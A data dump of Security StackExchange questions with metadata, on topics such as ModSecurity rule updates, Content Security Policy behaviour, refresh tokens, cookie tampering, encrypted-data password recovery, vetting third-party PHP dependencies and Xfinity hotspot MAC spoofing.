<p>Usually, you can run the script and modsec will update the rules for you. However, recently, this feature has stopped working. I get the following 404 error when I attempt to update the ruleset to 2.2.4:</p>

<pre><code>$ ./rules-updater.pl -rhttp://www.modsecurity.org/autoupdate/repository -prepository/ -Smodsecurity-crs
Could not load GnuPG module - cannot verify ruleset signatures
Fetching: modsecurity-crs/modsecurity-crs_2.2.3.zip ...
Failed to retrieve ruleset modsecurity-crs/modsecurity-crs_2.2.3.zip: 404 Not Found
</code></pre>

<p>We have a cron job which downloads and applies the rules frequently. It's been great up till now. Has anybody found a solution to this? Is anybody aware of other free/open repositories with self-update scripts? I've searched the forums, but no luck so far. Any help is greatly appreciate. </p>
","8552","","","","","2012-03-28 18:50:48","Mod_security rules-updater.pl fails to pull new release","<apache><mod-security><updates>","1","0","","","","CC BY-SA 3.0"
"152537","1","152540","","2017-02-28 03:42:07","","0","1045","<p>As I understand it, a masquerade attack is when an attacker acts as a registered/ authenticated user or entity in a system.  </p>

<p>There are obviously ways to prevent this, for example user education, don't leave passwords around, etc. But of course hackers have other ways of getting user credentials.  </p>

<p>This leads to the question; rather than <em>preventing</em> an attack, how do you respond to one? It seems that it isn't possible, as the whole point of a masquerade (or any attack) is to go unnoticed. Any insight will be appreciated. </p>
","140149","","140149","","2017-02-28 07:06:31","2017-02-28 07:06:31","How to tell when a masquerade attack is occurring?","<attacks><server><incident-response><account-security>","1","1","","","","CC BY-SA 3.0"
"152547","1","","","2017-02-28 08:17:37","","3","2414","<p>Inline scripts and styles are just a kind of language (CSS/Javascript) embedded in another langauge (HTML). Why are them not allowed by default under content security policy?</p>
","128856","","98538","","2017-02-28 09:32:46","2017-02-28 09:33:16","Why are inline scripts and styles considered not secure under content security policy?","<xss><content-security-policy>","2","0","","","","CC BY-SA 3.0"
"221803","1","","","2019-11-25 12:12:29","","0","148","<p>I recently stumbled upon <a href=""https://medium.com/@alexmngn/the-essential-boilerplate-to-authenticate-users-on-your-react-native-app-f7a8e0e04a42"" rel=""nofollow noreferrer"">this article</a> which recommends using two tokens for authentication.</p>

<blockquote>
  <p>Once the user is logged-in (or registered), the client receives an
  access token and a refresh token, and gets transitioned to the
  protected scene.</p>
  
  <p>The access token is a credential valid for 1 hour, used to access the
  protected content from the server API. When it expires, the client
  uses the refresh token to obtain a new access token. The refresh token
  is valid for 90 days [...]</p>
</blockquote>

<p>I'm guessing using two tokens is a security measure, but I can't imagine how it makes the system any safer. Wouldn't it be equally secure if there was only one token, valid for 90 days, which is used as the access token? What are the benefits of using another token?</p>
","186853","","6253","","2019-11-25 12:35:10","2019-11-25 12:35:10","Why use a refresh token for authentication?","<authentication><account-security><session-management>","0","6","","","","CC BY-SA 4.0"
"221812","1","221813","","2019-11-25 15:25:11","","0","208","<p>This question is similar to <a href=""https://security.stackexchange.com/questions/129606/hashing-cookie-values-preventing-cookie-stealing"">Hashing cookie-values &amp; preventing cookie-stealing</a> however, it is significantly different as I am interested in preventing (internal) subscription fraud, rather than an attack on the user's terminal from a malicious third party.</p>

<hr>

<p><strong>I have been using a simple local cookie to save my paid-subscriber site's user's user id.</strong> This prevents them from becoming annoyed by constant log-in requests. Nothing out-of-the-ordinary here.</p>

<p><strong>My concern is that it is too simple and can too easily be hacked by cutting and pasting the PC's local cookie file.</strong></p>

<p>If I were to track down my local cookie file on my PC, which is easy enough, I can copy it to a text reader and search until I find the info related to my site:</p>

<pre><code>GA1.2.662049077.1549644533U8EMOÔ¬AÔ¡Aexample.com__atuvc/1%7C5~8GPRÄâ’
¬AÄ…;N¡A.example.com__cfduid/d1240692ee84f4c8c756cee833d313a841558986
714ì±3µ”`ËoÙ_8O[]Ñcˇ¡Aƒ¡Awww.mysite.commy_cookie/7www.example.com8O^~
Ã¡A¢π¡Awww.GA1.2.662049077.1549644533U8EMOÔ¬AÔ¡Aexample.com__atuvc/34
GA1.2.662049077.1549644533U8EMOÔ¬AÔ¡Aexample.com__atuvc/
</code></pre>

<p>And there it is: <code>www.mysite.commy_cookie/7</code></p>

<p>It wouldn't take an overly talented analyst to figure out that this is a cookie which stores the user id for user # 7. If badhacker325 wanted perpetual access, badhacker325 could paste <code>www.mysite.commy_cookie/7</code> into the local cookie file and have perpetual, free access.</p>

<p>As coders and bakers of cookies, <strong>what tools do we have to prevent this kind of freeloading attack?</strong></p>

<p>It might be germane to know that I am working in php; though the scope here goes beyond coding language, imo.</p>

<hr>

<p>Not being the lazy sort, I have tried to work this out. I have solved for some scenarios, but I'm stuck on one component which I will identify below (mostly to maintain the suspense). Here are my attempts so far:</p>

<p>I have – instead of storing the simple user id <code>7</code> – created an array of:</p>

<pre><code>user_id
cookie_creation_time
user_ip
salt
</code></pre>

<p>I then imploded that to a delimited string, hashed it to unrecognizable bits and stored it. Now we get a cookie like this:</p>

<pre><code>www.mysite.commy_cookie/d1240692ee84f4c8c756c
ee833d313a841558986771www.example.com8O^~¬3†¢
</code></pre>

<p>This, however, still does not stop a user from idiot-savant copying the hash to their local cookies file and gaining access to my site like nothing was ever wrong.</p>

<p>What it does do correctly:</p>

<p>When reading back the IP, the script can discover that the users location is different from the location at which the cookie was set. This is a fail state, and the user is requested to re-enter their password.</p>

<p>This solves for space, but not time. (I'm not Einstein yet.)</p>

<p>My next thoughts were to use the <code>creation_time</code> value to test against a server value, and if that fails, to have the user re-enter their password. However, this seems to defeat the purpose of the <code>expires</code> parametre of php's <code>setcookie</code>.</p>

<hr>

<p>I suspect that I am overthinking this — or perhaps have misinterpreted some aspect of cookie usage altogether.</p>

<p>Does anybody have any thoughts? <strong>How can we prevent a high-jacking of the user's local cookie file to exploit accepted cookie use?</strong></p>
","220399","","98538","","2019-11-25 18:19:01","2019-11-25 18:20:43","Baking a better cookie - How can we prevent a high-jacking of the user's local cookie file to exploit accepted cookie use?","<cookies><account-security><session-management>","2","7","","","","CC BY-SA 4.0"
"221818","1","","","2019-11-25 16:56:11","","1","741","<p>My phone got stolen, and sent back to where it was stolen a day after.
At the moment of stealing, the phone was locked. When I received it back, there was no money left in my bank account. </p>

<p>The Banking app needs my fingerprint or a password to unlock. The passwords used for the banking app and the phone are different. </p>

<p>I assume there's no password caching for banking apps, since the app requires the password every time. Also, the account is most likely blocked if many attempts are made to unlock it. </p>

<p>What are the possible ways the hackers could have cracked into the phone and then the app?</p>

<pre><code>My device: iPhone 7 
Banking-App: Sberbank
</code></pre>
","164835","","","","","2020-03-08 10:34:58","How could a mobile banking app be hacked?","<account-security><iphone><smartphone>","0","4","","","","CC BY-SA 4.0"
"221856","1","","","2019-11-26 08:45:54","","1","184","<p>I'm currently migrating the encryption functionality used in a PHP project from <strong>mcrypt</strong> (which was <a href=""https://www.php.net/manual/en/migration71.deprecated.php#migration71.deprecated.ext-mcrypt"" rel=""nofollow noreferrer"">deprecated</a> in PHP 7.1.x and no longer works from PHP 7.2 onward) to <strong>openssl</strong>, using the <a href=""https://github.com/defuse/php-encryption"" rel=""nofollow noreferrer""><strong>defuse/php-encryption</strong> library</a>.</p>

<p>I would like to encrypt some of the data using the lib's <code>KeyProtectedByPassword</code> feature, so that the data is encrypted by a key that is itself protected by the user's password. Using the library is quite straight-forward, so that's not my issue here. Instead, I wonder if it's possible at all to implement a ""Forgot password"" functionality while preserving the encrypted data for the user?</p>

<p>My understanding is that there's no way around knowing the password to get the encryption key (otherwise the whole feature would be useless), so that would mean that the data is lost when the password is lost. There is a <code>changePassword</code> method, but that requires supplying the current password as well, so that won't help.</p>

<p>I also have 2FA implemented for the user accounts as a voluntary option.</p>

<ol>
<li>Could it help to save the key encrypted in a way that it can be decrypted using 2FA, in order to have a second measure to restore access, or will that introduce other security concerns?</li>
<li>How would I approach that? Simply using the 2FA secret key is not an option, as someone with access to the database could then just read that out and use it to decrypt the user's data.</li>
</ol>

<p><em>I already read similar questions like <a href=""https://security.stackexchange.com/questions/30193/encrypting-user-data-using-password-and-forgot-my-password"">this</a> and <a href=""https://security.stackexchange.com/questions/118658/handling-forgot-password-functionality-with-encrypted-data-without-security-qu"">this follow-up</a>. I might implement additional measures as suggested in the answers there as well, but I would like to get an answer considering 2FA and the use of this specific library.</em></p>
","222338","","","","","2019-11-26 08:45:54","How to implement a ""Forgot password?"" functionality using php-encryption's KeyProtectedByPassword and 2FA?","<encryption><php><multi-factor><account-security><password-reset>","0","0","","","","CC BY-SA 4.0"
"152695","1","","","2017-03-01 14:47:49","","0","3034","<p>I have installed Apache 2.4.7 with Drupal HTTPS site using Let's Encrypt cert. Mod_security is sucessfully installed, but is it able to defend against attacks, since the site is HTTPS?</p>

<p>I tried testing it for the simple SQLi, but it didnt trigger any events.</p>
","140770","","98538","","2017-03-01 16:06:21","2017-03-01 16:27:00","Apache ModSecurity for HTTPS traffic?","<tls><apache><mod-security>","1","2","","2017-03-01 17:51:40","","CC BY-SA 3.0"
"85877","1","","","2015-04-13 08:55:24","","3","1649","<p>I'm pen-testing a website that fixed most of its XSS vulnerabilities by just adding a Content Security Policy. There are still HTML injections in several places. I've tried to get a javascript-containing file onto the origin via an attachments feature, but it looks like a dead end.</p>

<p>Since I can't execute javascript, what can I use as a proof of concept to show the continued severity of HTML injection attacks despite the CSP? Are there any HTML tags I can still use to compromise security?</p>

<hr>

<p>The CSP has a default rule that only allows the same origin. However, there are exceptions for <code>data:</code> in <code>&lt;img&gt;</code>, and the policy also allows inline CSS.</p>
","72340","","","","","2015-06-12 22:29:43","What are some useful tags and payloads for HTML injection on CSP-protected sites?","<web-application><web-browser><xss><html><content-security-policy>","1","1","","","","CC BY-SA 3.0"
"222141","1","222156","","2019-12-02 09:05:03","","0","177","<p>I am doing a hypothetical web just for learn some security tips and the first problem I've found is the login, I've read like 40 articles, a lot of questions here on stackoverflow and I still don't know which method is the best one (this is a non-real case, so we can assume we need a very high security)</p>

<p>most webs I've developed I use a expirable access token that I need to send on every call to the API via query param or via Authorization header, then I store the token on the local storage</p>

<p>I've read some articles that claims that way is unsecure and the best way is with cookies, I've read also that the best way is with sessions </p>

<p>Any hint? I'm a bit confused about which way is the best one to secure first the authentication and then the store of the access token to make the authorization </p>
","219544","","219544","","2019-12-02 09:10:31","2019-12-02 12:01:01","Best way to authorize and authenticate a user on web API","<authentication><web-application><account-security><authorization>","2","2","","","","CC BY-SA 4.0"
"152884","1","","","2017-03-03 13:12:09","","1","1266","<p>I have a problem with my Yahoo Account because Account Key blocks me from logging in to my account.  </p>

<p>My fault is that I reformatted my phone while my Account Key was on. Now I don't have access to my account key and that's the only one that I use as my account recovery.  </p>

<p>I also put my phone number on my account, but I lost my SIM card and I also don't have a recovery email.  </p>

<p>I still can access my Facebook account using that email though.  </p>

<p>I searched many times on how to recover my account and removed that Account Key from Yahoo. But no hope. I also wish to remove that Account Key and change it to a password instead.  </p>

<p>So how can Yahoo can help me with my problem if I can't contact them? Can Facebook help me with my problem?</p>
","140991","","5405","","2017-03-03 14:28:01","2017-03-03 14:28:01","Yahoo Account Key Problem","<account-security>","0","1","","2017-03-03 15:13:10","","CC BY-SA 3.0"
"222387","1","222388","","2019-12-06 22:50:36","","1","182","<p>I’m expecting some information from a governmental organisation, they claim that they already send the info via email, but I have never received anything. </p>

<p>They also have an automatic reply email, when I email them, then I don’t even get the automatic reply in my outlook inbox or anywhere else. </p>

<p>The nature and the sensitivity of the information in the mails, and the fact that I miss a lot of emails, got me thinking if this possible, a third party can redirect emails. I don’t know if my scenario is even slightly possible! </p>

<p>I have a feeling that if someone selectively decides which emails should I receive. </p>

<p>I constantly changed my password, and even changed my devices, haven’t opened unknown emails and respect all the basic security steps</p>
","222942","","","","","2019-12-06 23:07:14","Can someone redirect or block emails of a specific sender?","<email><account-security>","1","0","","","","CC BY-SA 4.0"
"222457","1","","","2019-12-09 01:28:04","","87","20153","<p>I depend on PHP CLI for all kinds of personal and (hopefully, soon) professional/mission-critical ""business logic"". (This could be any other language and the exact same problem would still stand; I'm just stating what I personally use for the sake of context.)</p>

<p>To the furthest possible extent, I always code everything on my own. Only when absolutely necessary do I, reluctantly, resort to using a third-party library. For some things, this is simply necessary. For example, e-mail parsing and other very complicated stuff like that.</p>

<p>For managing such third-party libraries, I use <a href=""https://en.wikipedia.org/wiki/Composer_(software)"" rel=""noreferrer"">PHP Composer</a>. It's a library manager for PHP. It is able to download libraries, and their dependencies, and update them with commands similar to other ""package managers"". In a practical sense, this is <em>much</em> nicer than manually keeping track of this and manually downloading ZIP files and unpacking them and dealing with all sorts of problems. It at least saves a lot of practical headaches.</p>

<p><strong><em>However</em></strong>, the most fundamental security problem still persists: I have no idea what this ""installed"" code contains, nor do I know what is added/changed with every update. One of the libraries' authors could have easily been compromised one day when my Composer fetches updates, causing my PHP CLI scripts to suddenly send my Bitcoin wallet.dat to some remote server, install a RAT/trojan on my machine, or even worse. In fact, it could already have happened, and I would be none the wiser. I simply have no idea. I logically cannot have any idea.</p>

<p>My own code base is about 15,000 lines in total. It takes me over a year to painstakingly go through that code base. And that's code that <em>I</em> have written and which I know intimately...</p>

<p>My ""Composer"" directory tree currently is at <strong><em>over 120,000 lines of code</em></strong>. And that's for the <em>minimal</em> number of <em>crucial</em> PHP libraries that I need. I use very few, but they have various dependencies and tend to overall be very bloated/inflated compared to my own code.</p>

<p>How am I ever supposed to ""vet"" all this?! It's simply not going to happen. I ""zone out"" very shortly after even attempting. I don't even know how I'm going to make it through another ""vet round"" of <em>my own</em> code -- let alone this 10x larger one, coded by other people.</p>

<p>When people say that it's a ""must"" to ""vet third-party code"", what exactly do they mean? I also agree that it's a ""must"", but then there's the pesky reality. I will simply never have the time and energy to do this. Also, I obviously don't have the money to pay somebody else to do it.</p>

<p>I spent countless hours trying to learn about <a href=""https://en.wikipedia.org/wiki/Docker_%28software%29"" rel=""noreferrer"">Docker</a> and see if there were some way I could ""encapsulate"" these untrusted third-party libraries somehow, but it's a losing battle. I found it utterly impossible to get that going, or have any of my many questions in regards to it answered. I don't even think it's possible in the way that I imagine it.</p>
","223021","","1271","","2019-12-10 13:44:04","2019-12-11 21:53:27","How am I ever going to be able to ""vet"" 120,000+ lines of Composer PHP code not written by me?","<privacy><audit><source-code><code-review><security-theater>","6","1","","2019-12-14 12:30:38","","CC BY-SA 4.0"
"222486","1","222490","","2019-12-09 13:41:43","","5","366","<p>I have a website in which I include several CSS stylesheets from my own server and <a href=""https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"" rel=""noreferrer"">one stylesheet from a remote server</a>.</p>

<p>I wanted to write my Content Security Policy in a way to permit all local stylesheets, and only this one specific remote style sheets. This was my attempt:</p>

<pre><code>style-src 'self' 'sha256-L/W5Wfqfa0sdBNIKN9cG6QA5F2qx4qICmU2VgLruv9Y='
</code></pre>

<p>However, upon navigating to my website, Chrome 78 claimed that the remote stylesheet does not match the existing Content Security Policy and refused to apply it. I looked at <a href=""https://security.stackexchange.com/questions/221235/content-security-policy-style-hash"">this similar question</a>, where the solution was to apply <code>'unsafe-hashes'</code>, which did not solve my problem. It seems as if there is a difference between an externally included script and an inline script.</p>

<p>So my question is: Why does Chrome claim this script is not allowed? And what do I need to allow this script? (Aside from a generic whitelist for the domain)</p>
","","user163495","","","","2019-12-09 15:05:13","Why does Chrome claim that this stylesheet violates the Content Security Policy?","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"153247","1","","","2017-03-07 20:22:53","","0","1620","<p>Yesterday I got back home from an overseas trip to Germany only to find that my Gmail was logged in from China. Now  I'm not tech savvy and believe I might have made some mistakes regarding security but how in god's name did someone from China access my Gmail account? I could not login to my account while in Germany due to Gmail blocking it as a suspicious login but it allowed someone from China? </p>
","141328","","98538","","2017-03-07 21:33:37","2017-03-07 22:03:07","How was my Gmail account hacked from China?","<email><account-security><gmail>","2","2","","2017-03-08 07:09:06","","CC BY-SA 3.0"
"153300","1","153807","","2017-03-08 10:25:19","","3","837","<p>I am in the process of implementing a CSP header for a webapp, with the goal of reducing possible XSS attacks. See <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"" rel=""nofollow noreferrer"">CSP</a> for an overview of CSP. I provided the base-uri directive as 'self' and this works as expected with violations being reported to the report-uri. See <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"" rel=""nofollow noreferrer"">base-uri</a> for an explanation of the base-uri directive. </p>

<p>What is surprising to me is that when I use chrome (Version 56.0.2924.87 64-bit) to ""View page source"" there is a CSP violation report. Here is an example of the violation report:</p>

<pre><code>{
""csp-report"": {
    ""document-uri"": ""http://localhost:8080/frontend/Page1.action?param1=1"",
    ""referrer"": """",
    ""violated-directive"": ""base-uri"",
    ""effective-directive"": ""base-uri"",
    ""original-policy"": ""base-uri 'self'; report-uri /frontend/CspReport.action?"",
    ""disposition"": ""report"",
    ""blocked-uri"": ""http://localhost:8080/frontend/"",
    ""status-code"": 200
    }
}
</code></pre>

<p>I simplified the policy to make sure nothing else is interfering. From what I understand the ""blocked-uri"" should match the 'self' keyword because it matches the beginning of the ""document-uri"".</p>

<p>What makes this more strange is that it only happens when viewing source on some pages (but on these pages it happens 100% of the time) and does not seem to happen on firefox at all and does not happen when simply navigating between pages.</p>

<p>So, the question is why is this a CSP violation when it seems to not violate the specified directive?</p>
","67261","","","","","2017-03-14 12:44:58","CSP base-uri directive on ""View page source"" on","<xss><content-security-policy>","1","6","","","","CC BY-SA 3.0"
"153313","1","","","2017-03-08 14:55:39","","9","1349","<p>I work as a contractor in the IS Security field. I was hired by my current client to design and enforce a methodology to make sure security risks are assessed and addressed in all IT projects. Besides this assignment, my client asked me yesterday what my knowledge of the Security by Design (SbD) concept was, if I thought it was applied in his organization and how my mission contributed to this. I honestly replied that while I had a basic understanding of what SbD is, I didn't feel comfortable giving him a definitive answer on the spot and that I would look into it.</p>

<p>Which I did. But it seems pretty hard to find a concrete definition of SbD. My impression is that it is - in practice, I know there is an actual and important concept behind these words - mainly used as a fashionable marketing argument people put in their presentations to please management. But are there concrete criteria to assess if a project / organization applies the SbD concept? Or is it just the idea of taking security problems into account in every aspect of the work, and letting one decide how to enforce this?</p>
","47893","","6253","","2017-03-08 15:11:44","2017-03-09 17:30:06","Security by design - clarification","<security-by-design>","2","2","","","","CC BY-SA 3.0"
"222589","1","222597","","2019-12-11 11:25:40","","4","4225","<h3>Background</h3>

<p>Comcast/Xfinity operates various wireless hotspots across the US, accessed via the SSID <em>xfinitywifi</em> through the many wireless access points shown on <a href=""https://hotspots.wifi.xfinity.com/"" rel=""nofollow noreferrer"">https://hotspots.wifi.xfinity.com/</a></p>

<p><em>xfinitywifi</em> hotspots are all open/unsecured, and, to use such a hotspot, an Xfinity subscriber simply connects to the <em>xfinitywifi</em> SSID. Only Xfinity subscribers are allowed to use a hotspot, and if an unrecognized device connects to <em>xfinitywifi</em>, the user of that device will be redirected to an Xfinity Wifi login page, where they enter their Xfinity account credentials. </p>

<p>If all is good, Xfinity will simply store the MAC address of that device, and associate it with that subscriber's account. All of this happens seamlessly and invisibly to the user. And anyone using that device will never have to go through a login screen for <em>xfinitywifi</em> ever again! (unless that subscriber manually goes and removes that device via <a href=""https://www.xfinity.com/support/articles/manage-wifi-devices-my-account"" rel=""nofollow noreferrer"">https://www.xfinity.com/support/articles/manage-wifi-devices-my-account</a>, a page most Xfinity users likely know <em>nothing</em> about!)</p>

<h3>Question</h3>

<p>Does Xfinity recognize ""allowed <em>xfinitywifi</em> devices"" solely via their MAC addresses? If so, then what prevents someone from creating a malicious access point broadcasting SSID <em>xfinitywifi</em>, but secretly pointing to the legitimate <em>xfinitywifi</em> SSID, from sniffing (while sending over the unmodified) subscribers' MAC addresses? (i.e., to obtain mac address(es) for free internet service or for masking illegal internet activity)</p>

<ul>
<li><p><em>Edit #1</em>: One might say, ""what about the volume of non-subscribers connecting their devices just hoping to get free wifi?"" Well, you can probably find out which MAC addresses are registered or not by monitoring which traffic goes to the users' intended destinations, and which MAC addresses just end up sent over back to the Xfinity website (presumably for login purposes). The idea is just to steal MAC addresses, not login credentials, since apparently the right MAC address is all that's needed for xfinitywifi internet service anyway.</p></li>
<li><p><em>Edit #2</em>: Xfinity might automatically de-register MAC addresses when it notices the same one being used from two different networks. In that case, just have the malicious access point do some MAC address translation instead. The valid users that end up repeating the Xfinity wifi login process will then have, unbeknownst to them, secretly added new MAC addresses to their list of allowed devices (under their Xfinity account/s). And now the hacker has something they can use for free internet service (or masking illegal activity spoofing as some other innocent Xfinity subscriber instead).</p></li>
</ul>
","25009","","25009","","2019-12-15 19:14:22","2020-03-18 17:49:17","Is it possible to mac-spoof Xfinity Wireless?","<authentication><wifi><account-security><spoofing><isp>","2","0","","","","CC BY-SA 4.0"
"222616","1","","","2019-12-11 20:41:07","","0","208","<p>My question is similar to these:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/17998/protect-sensitive-data-from-sysadmin-prying-eyes"">Protect sensitive data from sysadmin prying eyes</a> </li>
<li><a href=""https://security.stackexchange.com/questions/30116/restrict-access-to-a-specific-directory-on-linux"">Restrict access to a specific directory on Linux</a> </li>
</ul>

<p>From those, I understand that SELinux could accomplish my goal. But <strong>we do not have the resources to use SELinux</strong>, so I want to know if there is another way -- specifically Grsecurity (or AppArmor).</p>

<p>Background: In our small organization, we have a few developers and a junior sysadmin who all have full root access and physical access to the servers. They need to be able to do server maintenance and a variety of other tasks which require fairly unrestricted sudo rights. </p>

<p>However, these privileged users do not have the password to unlock the encrypted filesystem after rebooting. (When the server is running, they currently have full access to all files, of course. Hence my question.)</p>

<p>As in the referenced questions above, my requirement is that these root users not have access to data which is located under certain directories. <strong>Can this be accomplished with Grsecurity alone?</strong> </p>

<p><a href=""https://www.cyberciti.biz/tips/selinux-vs-apparmor-vs-grsecurity.html"" rel=""nofollow noreferrer"">Linux Kernel Security (SELinux vs AppArmor vs Grsecurity) - nixCraft</a> indicates that <strong>Grsecurity is a MAC</strong> (mandatory access control) but then specifies that:</p>

<blockquote>
  <p>it is a RBAC implementation using access control lists.</p>
</blockquote>

<p>I'm not familiar with what that means. (We do use ACL'S.) I understand that a MAC will allow me to implement a policy limiting access to the directories in question even for users with full sudo rights. So will Grsecurity do this?</p>

<p>I believe the fully encrypted file system will prevent a user from rebooting with a live USB key (or similar) to bypass the running OS and access those locations.</p>

<p>Can we accomplish this goal with only Grsecurity (and ACL's)? That would be ideal. If not, can we accomplish the goal with AppArmor?</p>
","37051","","","","","2019-12-11 22:45:37","Restrict privileged users from accessing certain directories on Linux servers with Grsecurity?","<privacy><hardening><selinux><apparmor><grsecurity>","1","3","","","","CC BY-SA 4.0"
"222664","1","","","2019-12-12 14:18:53","","0","1785","<h1>Description:</h1>
<p>I want to create an upload center for small files (word/excel/zip documents etc) with PHP.</p>
<ol>
<li>I want to protect files uploaded by user as much as possible, so if server is breached, attacker cannot read/open these files.</li>
<li>I just want to minimize the damage in case of a breach/attack.</li>
<li>If all encrypted files are breached, and cannot be decrypted it's okay</li>
<li>It's acceptable if in worst case scenario a few files are breached (unencrypted), or even files for a few users, but not all files at once etc (like I said, just trying to minimize the damage).</li>
<li>In best case scenario only the user (who uploaded files) can access his own (unencrypted) files, but it is okay if Admin can also read those.</li>
</ol>
<h1>What I've already thought of:</h1>
<ol>
<li>First I thought of having a random password created for each file, storing that password in database but before storing them, those passwords are also encrypted by a master password defined by admin. But if the server is breached, attacker can also have access to both passwords and files and it only gives him a little extra effort... which seems like false sense of security.</li>
<li>Then I thought that each user, can have a secondary encryption password, stored in <code>$_SESSION</code> (before storing it in SESSION it is encrypted by a random temporary key), that <code>$_SESSION</code> password is only used to encrypt and decrypt files. But in case the user wants to change this password, we have to rewrite all older encrypted files... or store that old password on database and encrypt it with the new password to use for those old files! which makes things complicated.</li>
</ol>
<p>Is there a better way to do this with a single server and no extra hardware?</p>
<p>Do any of my ideas provide the minimal (best I can) security I'm looking for?</p>
","219242","","-1","","2020-06-16 09:49:05","2019-12-12 14:18:53","How to encrypt user files securely on the server with PHP","<encryption><php><account-security><file-encryption><file-access>","0","7","","","","CC BY-SA 4.0"
"86561","1","86615","","2015-04-22 10:16:16","","4","3045","<p>Assuming that users are using modern browsers, is implementing a strict CSP policy enough to prevent all XSS attacks?</p>

<p>I'm working on a Backbone app, and am wondering if I still need to be escape user data on the client to display all the time.</p>
","11012","","71164","","2015-04-22 12:13:21","2015-05-22 09:00:26","Is CSP enough to prevent XSS attacks","<web-application><xss><content-security-policy>","3","1","","2015-04-22 18:39:49","","CC BY-SA 3.0"
"153537","1","153538","","2017-03-11 10:40:22","","37","3005","<p>I recently did an experiment using MitM to gain account information (username and password) while accessing websites. I used two PCs in the scenario; one as the target, running Internet Explorer, and one as the attacker, running ettercap. One attempt (pretending to be steamcommunity.com) yielded information; the target accepted the attacker's fake CA self-signed certificate presented via the MitM attack. The other attempt (pretending to be facebook.com) didn't even allow me to add an exception for the self-signed certificate on the target machine. So the question is, why did one website allow me to add an exception while the other one didn't?</p>
","141653","","","","","2017-03-11 11:06:41","Why are some websites seemingly immune to self-signed certificate MitM attacks?","<tls><certificates><man-in-the-middle><certificate-authority><account-security>","1","0","","","","CC BY-SA 3.0"
"222885","1","","","2019-12-17 18:11:37","","2","111","<h1>Given...</h1>

<ul>
<li>a public web service with enabled SSL/TLS</li>
<li>the web service enforces authentication using JSON Web Tokens</li>
<li>a client on a LAN without an Internet connection</li>
<li>a proxy on the LAN that grants point-to-point connections to mentioned web service</li>
</ul>

<h1>When.</h1>

<ul>
<li>I want to connect to the proxy in order to access the web services</li>
<li>and I discuss with security folks what I have in mind</li>
</ul>

<h1>Then...</h1>

<ul>
<li>Security folks (experts/consultants) usually recommend additional authentication with the local proxy</li>
<li>I think of possible threat scenarios</li>
<li>I think the recommendation must be copied from some generic security guideline</li>
<li>I don't see a huge security benefit as authentication is already present but happens at the end of the tunnel</li>
</ul>

<h1>My reflections so far:</h1>

<ul>
<li>Even when I do not see huge benefits, an additional layer increases security</li>
<li>Then: more complex solutions are more error-prone. Errors may decrease security</li>
<li>A hypothetical attack to the web service (think of DoS) from the LAN would look as if it originates from the proxy and maybe it cannot be linked to a client IP.</li>
</ul>

<p>But maybe I have missed something. So that's why I ask for a different angle to look at this matter. Maybe someone can point me in the right direction and could show me a risk that absolutely mandates to enable authentication on the proxy. Thanks in advance!</p>
","24894","","221316","","2019-12-18 07:30:20","2019-12-18 07:30:20","Benefit of authentication with a gateway","<authentication><web-service><http-proxy><security-theater>","0","0","","","","CC BY-SA 4.0"
"86757","1","86771","","2015-04-23 23:54:29","","0","383","<p>Looking to implement some additional mod_sec rulesets on our server. OWASP and Atomic keep coming up as the best of the best. Would it be wise to implement both? Or, would one or the other be sufficient for PCI compliance?</p>
","49352","","","","","2015-04-24 07:52:03","OWASP + Atomic ModSecurity Rulesets - Too much?","<linux><owasp><mod-security>","1","0","","","","CC BY-SA 3.0"
"222965","1","","","2019-12-19 02:45:26","","1","194","<p>Are there any additional attack vectors that apply when an OS is being updated? For example, would the services that are being updated be unstable? 
An OS is generally more secure after being updated, but I would like it if someone could explain how an OS can be attacked (additional attack vectors, etc.) <em>while</em> it is being updated.</p>
","219493","","","","","2019-12-19 05:20:47","Is an OS more vulnerable while it is being updated?","<network><penetration-test><vulnerability><account-security><operating-systems>","1","0","","","","CC BY-SA 4.0"
"223022","1","","","2019-12-19 21:39:03","","6","1909","<p>There were two response headers which could be set by servers to instruct browsers to enable heuristics based reflected XSS detection and prevention in the past.</p>
<ol>
<li>X-XSS Protection: 1; mode=block</li>
<li>Content-Security-Policy: reflected-xss</li>
</ol>
<h1>X-XSS Protection</h1>
<p>This header <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection"" rel=""noreferrer"">according to MDN</a>;</p>
<ul>
<li>Chrome has an &quot;<a href=""https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/TuYw-EZhO9g/blGViehIAwAJ"" rel=""noreferrer"">Intent to Deprecate and Remove the XSS Auditor</a>&quot;</li>
<li>Firefox have not, and <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=528661"" rel=""noreferrer"">will not implement X-XSS-Protection</a></li>
<li>Edge have <a href=""https://blogs.windows.com/windowsexperience/2018/07/25/announcing-windows-10-insider-preview-build-17723-and-build-18204/"" rel=""noreferrer"">retired their XSS filter</a></li>
</ul>
<h1>Content Security Policy</h1>
<p>The CSP 2.0 nor 3.0 specifies a directive reflected-xss. It was in the drafts of CSP 2.0 and most modern browsers does not support it (<a href=""https://www.chromestatus.com/feature/5769374145183744"" rel=""noreferrer"">Chrome</a>) or have no mention of the directive.</p>
<ol>
<li>Is if it a fair assumption that modern browsers do not have any heuristics based XSS protection that could be controlled by a server header?</li>
<li>Are there any other XSS protection headers which are widely adopted?</li>
</ol>
","121141","","-1","","2020-06-16 09:49:05","2019-12-19 23:55:24","What was the real reason for dropping reflected-xss directive from CSP?","<xss><content-security-policy><reflected-xss>","1","1","","","","CC BY-SA 4.0"
"153862","1","","","2017-03-14 21:09:47","","-1","77","<p>We have a build system, which fetches the sources and executes build commands. At present a dedicated person (build master) does the fetching with her personal account in the source control system.</p>

<p>We'd like to automate the build process. How can access to the source control system be secured?</p>

<p>I see an option to create a ""shared account"" (let's call it <code>buildmaster</code>) so that the user who is authorised to do the build would use a script with <code>buildmaster</code>'s credentials (in our case - username/password) to fetch the sources. How could then <code>buildmaster</code>'s password be made available to only those users who are authorised to run (production) builds?</p>
","50647","","","","","2017-03-14 21:53:37","How to secure access to build system credentials?","<passwords><account-security>","1","1","","","","CC BY-SA 3.0"
